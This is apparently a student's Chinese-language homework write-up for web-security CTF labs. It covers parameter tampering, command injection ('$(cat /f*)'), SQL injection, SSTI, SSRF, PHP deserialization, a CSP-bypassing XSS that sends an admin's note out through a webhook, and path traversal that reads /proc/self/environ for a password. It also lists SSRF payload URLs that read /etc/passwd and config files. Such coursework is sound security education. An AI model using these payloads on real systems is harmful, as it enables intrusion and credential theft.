# HW4

## \[Lab\] Cat Shop

- Flag: `FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}`

### 解題過程 & 思路

1. 觀察網站不同 item 的路徑，找到 flag 的購買頁面。
2. 發現隱藏的 element，將其值改成 0 (如下)。
    1. `<input type="hidden" name="cost" value="0">`
3. 就可以順利取得 Flag 了。
    
![](/pic/hw4/1.png)
    

## \[Lab\] DNS Lookuper

- Flag: `FLAG{Y0U_$(Byp4ssed)_th3_`waf`}`

### 解題過程 & 思路

1. 觀察網站輸入部分與檢查部分。
    
![](/pic/hw4/2.png)
    
2. 使用 `'$(cat /f*)'` 即可注入並取得 Flag。
    
![](/pic/hw4/3.png)


## \[Lab\] Log me in

- Flag: `FLAG{b4by_sql_inj3cti0n}`

### 解題過程 & 思路

1. 這題是簡單的 SQL injection，通過便能取得 Flag。
    
![](/pic/hw4/12.png)

![](/pic/hw4/13.png)


## \[Lab\] Jinja2 SSTI

- Flag: `FLAG{ssti.__class__.__pwn__}`

### 解題過程 & 思路

1. 這題是後端模板注入 (Server Side Template Injection, SSTI)，首先觀察 source code，並做出下列測試。
    1. `{{7*7}}`
    2. `{{config}}`
2. 發現可以注入之後，拿出目標 module，就可以 RCE 了。
    
![](/pic/hw4/14.png)
    

> Reference

1. [ctf中的python ssti - SAUCERMAN](https://saucer-man.com/information_security/516.html)
2. [服务端模板注入 - 10.0.0.55 CTF Docs](https://10-0-0-55.github.io/web/flask/ssti/)

## \[Lab\] Preview Card

- Flag: `FLAG{gopher://http_post}`

### 解題過程 & 思路

1. 這題有 SSRF (Server Side Request Forgery) 的漏洞，有辦法以 server 的身分戳到 flag.php 就能拿到 Flag。
    
![](/pic/hw4/4.png)

![](/pic/hw4/5.png)
    

## \[Lab\] Magic Cat

- Flag: `FLAG{magic_cat_pwnpwn}`

### 解題過程 & 思路

1. 利用 unserialize 的性質，並覆蓋 class method 與 attribute，成功在 unserialize 過程執行到 inject 的 payload，以達到 rce 並取得 Flag。
    
![](/pic/hw4/6.png)

![](/pic/hw4/7.png)
    

> Reference

1. [Online PHP Compiler](https://www.programiz.com/php/online-compiler/)
2. [PHP Sandbox - Execute PHP code online through your browser](https://onlinephp.io/)
3. [Exploiting insecure deserialization vulnerabilities | Web Security Academy](https://portswigger.net/web-security/deserialization/exploiting)
4. [Zeerg/insecure_deserialize: example dockerfile for insecure_deserialize in php](https://github.com/Zeerg/insecure_deserialize)
5. [PayloadsAllTheThings/Insecure Deserialization/PHP.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md)

## \[HW4\] Double Injection

- Flag Q1: `FLAG{sqlite_js0n_inject!on}`
- Flag Q2: `FLAG{ezzzzz_sqli2ssti}`

### 解題過程 & 思路

1. 這題要做 SQL injection，看了 source code 之後原本以為是要以 error-based 的方式取得 Flag，嘗試一陣子發現 sqlite 加上能注入的地方可能不能做到這件事。
2. 所以改研究拿出 Flag 並比對的方法，成功拿到 Flag 後，每次只拿一位並做爆搜，如此便能取得完整的 Flag1。 (見 main_q1.py)
3. 第二題原本以為是 sqlite 的 RCE，但是發現不能夠 load_extension，再次研究 source code 後發現有 `ejs.render` SSTI 的漏洞，因此可以達到 RCE，後來發現上課講義有提到這件事。

> Reference

1. [Syntax Diagrams For SQLite](https://www.sqlite.org/syntaxdiagrams.html)
2. [Built-In Scalar SQL Functions](https://www.sqlite.org/lang_corefunc.html)
3. [Application-Defined SQL Functions](https://www.sqlite.org/appfunc.html)
4. [sql - How to return custom error code in sqlite3? - Stack Overflow](https://stackoverflow.com/questions/12701415/how-to-return-custom-error-code-in-sqlite3)
5. [mysql - Does JSON.stringify a string protect against (My)SQL injection? - Stack Overflow](https://stackoverflow.com/questions/30170363/does-json-stringify-a-string-protect-against-mysql-injection)
6. [javascript - Preventing SQL injection in Node.js - Stack Overflow](https://stackoverflow.com/questions/15778572/preventing-sql-injection-in-node-js)
7. [DUCTF - sqli2022 challenge (web)](https://www.justinsteven.com/posts/2022/09/27/ductf-sqli2022/)
8. [A “Simple” OS Command Injection Challenge | by Eileen Tay | CSG @ GovTech | Medium](https://medium.com/csg-govtech/a-simple-os-command-injection-challenge-5acf92799f74)
9. [ECW 2019 CTF Qualification - SecureVault](https://www.aperikube.fr/docs/ecw_qual_2019/securevault/)
10. [PayloadsAllTheThings/SQL Injection/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
11. [sqlite_web - hxpCTF 2022 | bi0s](https://blog.bi0s.in/2023/03/14/Web/Sqlite_web_hxpctf22/)
12. [SELECT code_execution FROM * USING SQLite; - Check Point Research](https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/)
13. [SQL injection to RCE. SQL injection is a type of web… | by Aditya Chauhan | Medium](https://aditya-chauhan17.medium.com/sql-injection-to-rce-dd538d49a7f)
14. [ejs render string ctf injection - Google 搜尋](https://www.google.com/search?q=ejs+render+string+ctf+injection)
15. [CTF | 2021 Hgame Week4 WriteUp | MiaoTony's小窝](https://miaotony.xyz/2021/03/04/CTF_2021HgameWeek4/)
16. [前端的模板注入攻擊：CSTI | Beyond XSS](https://aszx87410.github.io/beyond-xss/ch3/csti/)

## \[HW4\] Note

- Flag Q1: `FLAG{byp4ss1ing_csp_and_xsssssssss}`
- Flag Q2: `FLAG{n0t_just_4n_xss}`

### 解題過程 & 思路

1. 這題先測試 CSP 的威力，確實沒辦法簡易的 XSS，途中還有試過透過 unpkg import angular，也有在網站在尋找是否有 JSONP 的漏洞，不過沒測試出好的結果。
2. 後來發現有人寫了 csp-bypass 的插件，只要能夠從 unpkg 或是 cloudflare 等等代管平台 import 任意 script 就可以做到 XSS。
3. 可以 XSS 後，但是不能偷 httpOnly 的 cookie，只好嘗試看看透過戳後端 api 拿到 admin 身上唯一的 note 並回傳； 另外，為了讓 innerHTML 內的東西可以順利注入，使用了 iframe srcdoc 繞過；並且使用 webhook 與 `top.location.href` 的方法，讓 xss-bot 以 admin 的身分讀到 note 內容，並以網頁跳轉的方式繞過 csp 回傳內容。
4. 因為 note 有大小限制，所以只好把 script 丟到 npm 讓面再用 unpkg import，完成流程後就可以順利拿到 Flag 啦。
    
![](/pic/hw4/8.png)
    
5. 第二題部分，發現後端在讀取 note 時沒有檢查 `note_id`，而且還有 `os.path.join` 的漏洞，所以一樣可以請 xss-bot 幫忙以 admin 的身分讀取，讀取 `/etc/passwd` 檔案做測試，發現真的可以順利讀到。
    
![](/pic/hw4/9.png)
    
6. 因為不知道 flag2 的全名，而 `open` & `os.path.exist` 不能用 wildcard & regex 繞開，所以想直接改讀取 `/app/Dockerfile` 的內容，沒想到不知為何 xss-bot 一直不回傳內容，所以只好改偷 admin 的密碼。
7. 透過讀取 `/proc/self/environ` 的內容，拿到 admin 的密碼，其餘的就好辦了，以 admin 身分登入，再用相同 api 讀取 `/app/Dockerfile` 的內容，就能拿到 Flag。
    
![](/pic/hw4/10.png)

![](/pic/hw4/11.png)
    

> Reference

1. [Content Security Policy Examples](https://csper.io/docs/content-security-policy-examples)
2. [繞過你的防禦：常見的 CSP bypass | Beyond XSS](https://aszx87410.github.io/beyond-xss/ch2/csp-bypass/)
3. [[Day10] 繞過你的防禦：常見的 CSP bypass - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10316449?sc=rss.iron)
4. [CSP绕过总结 · 风之栖息地|hurricane618's blog](https://hurricane618.me/2018/06/30/csp-bypass-summary/)
5. [[Day5] 危險的 javascript: 偽協議 | CTF导航](https://www.ctfiot.com/133698.html)
6. [CanardMandarin/csp-bypass: Need any help bypassing CSP ?](https://github.com/CanardMandarin/csp-bypass)
7. [SecurityBoat CTF XSS Challenge November » Securityboat](https://securityboat.net/securityboat-ctf-xss-challenge-november/)
8. [javascript - HTML:Use quotes within quotes within quotes - Stack Overflow](https://stackoverflow.com/questions/19845167/htmluse-quotes-within-quotes-within-quotes)
9. [How to publish a js library to NPM and CDN | by Gaute Meek Olsen | Medium](https://medium.com/@gaute.meek/how-to-publish-a-js-library-to-npm-and-cdn-9d0bf9b48e11)
10. [0CTF 2023 Writeups - Huli's blog](https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/)
11. [【第十七天 - 文件讀取漏洞】 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10276105)
12. [m0leCon CTF 2022 筆記 · Issue #119 · aszx87410/blog](https://github.com/aszx87410/blog/issues/119)
13. [RCTF 2022 筆記 · Issue #131 · aszx87410/blog](https://github.com/aszx87410/blog/issues/131)
14. [msfrognymize | Siunam’s Website](https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/?ref=www.ctfiot.com)

## \[HW4\] Private Browsing: Revenge

- Flag: `Null`

### 解題過程 & 思路

1. 本題具有 SSRF 的漏洞，因此可以用下方這些 payload 拿到一些關於網站架構與邏輯的檔案。

```jsx
http://10.113.184.121:10083/api.php?action=view&url=file://127.0.0.1/etc/passwd

http://10.113.184.121:10083/api.php?action=view&url=file://127.0.0.1/var/www/html/config.php
http://10.113.184.121:10083/api.php?action=view&url=file://127.0.0.1/var/www/html/api.php

http://10.113.184.121:10083/api.php?action=view&url=file://127.0.0.1/readflag.c
```

2. 發現後端有 redis，為了跟後端連線嘗試了下列方法想繞過 gethostbyname 的檢查，有參考各類資料想辦法藉由控制不同工具解析 host name 的方法，不過嘗試各式各樣的變化似乎還是連不上 redis，不確定是不是工具不對，所以沒有成功連線。

```jsx
http://10.113.184.121:10083/api.php?action=view&url=tcp://aaa@redis:6379@127.0.0.1/_
http://10.113.184.121:10083/api.php?action=view&url=gopher://aaa@redis:6379@127.0.0.1/_

http://10.113.184.121:10083/api.php?action=view&url=gopher://127.0.0.1:80/

http://10.113.184.121:10083/api.php?action=view&url=gopher://127.0.0.1:80/_GET%20/var/www/html/api.php%20HTTP/1.1%0D%0AHost:127.0.0.1%0D%0A%0D%0A
http://10.113.184.121:10083/api.php?action=view&url=gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:redis:6379%0D%0A%0D%0A
```

3. 不過如果成功連線的話，可能可以嘗試注入 webshell 等方法。

> Reference

1. [AIS3 Pre-exam 2022 Write Up - HackMD](https://hackmd.io/@Ching367436/AIS3_Pre-exam_2022_Write-Up#Private-Browsing-500-pts)
2. [filter var - Validating non-private IP addresses with PHP - Stack Overflow](https://stackoverflow.com/questions/17150100/validating-non-private-ip-addresses-with-php)
3. [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
4. [HTML URL Encoding Reference](https://www.w3schools.com/tags/ref_urlencode.ASP)
5. [利用redis写webshell | 离别歌](https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html)
6. [Redis写webshell_redis dict写webshell-CSDN博客](https://blog.csdn.net/weixin_54227009/article/details/125154623)
7. [Redis攻防(未授权访问、利用redis写入webshell、任务计划反弹、Shellssh-keygen 公钥登录服务器、利用主从复制RCE)-CSDN博客](https://blog.csdn.net/q20010619/article/details/121912003)
8. [xss->ssrf->redis · sky's blog](https://skysec.top/2018/08/17/xss-ssrf-redis/)
9. [ssrf与gopher与redis - sijidou - 博客园](https://www.cnblogs.com/sijidou/p/13681845.html)
10. [XSS的威力：从XSS到SSRF再到Redis-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/156377)
11. [FwordCTF 2020 - Web/Bash Writeups | Ahmed Belkahla](https://ahmed-belkahla.me/post/fword-ctf2020/)
12. [CSRF and DNS-rebinding to RCE in Selenium Server (Grid) - /dev/posts/](https://www.gabriel.urdhr.fr/2022/02/07/selenium-standalone-server-csrf-dns-rebinding-rce/)
13. [AIS3 EOF CTF 初賽 | Kaibro's blog](https://blog.kaibro.tw/2018/01/16/AIS3-EOF-2017-%E5%88%9D%E8%B3%BD/)
14. [2020::AIS3::前測官方解 · NiNi's Den](https://blog.terrynini.tw/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/)
